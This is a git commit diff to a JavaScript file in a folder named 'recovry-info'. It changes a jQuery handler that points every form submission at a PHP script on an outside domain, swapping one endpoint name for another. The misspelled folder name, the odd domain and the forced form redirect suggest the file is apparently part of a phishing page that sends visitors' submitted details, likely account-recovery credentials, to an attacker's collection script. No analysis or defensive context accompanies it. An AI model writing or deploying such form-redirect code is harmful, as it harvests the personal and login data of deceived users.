ce7b4506f03eeb4e606d386a5906951f78989610
yourscontent <130046993+yourscontent@users.noreply.github.com>
2023-07-10 16:56:35 +0700

    Update script2.js

--- recovry-info/script2.js
+++ recovry-info/script2.js
@@ -1,3 +1,3 @@
 $("form").submit(function() {
-  $(myform).attr("action", "https://jinkontot-contole.my.id/tepakxs1.php");
+  $(myform).attr("action", "https://jinkontot-contole.my.id/tepakxs.php");
 });
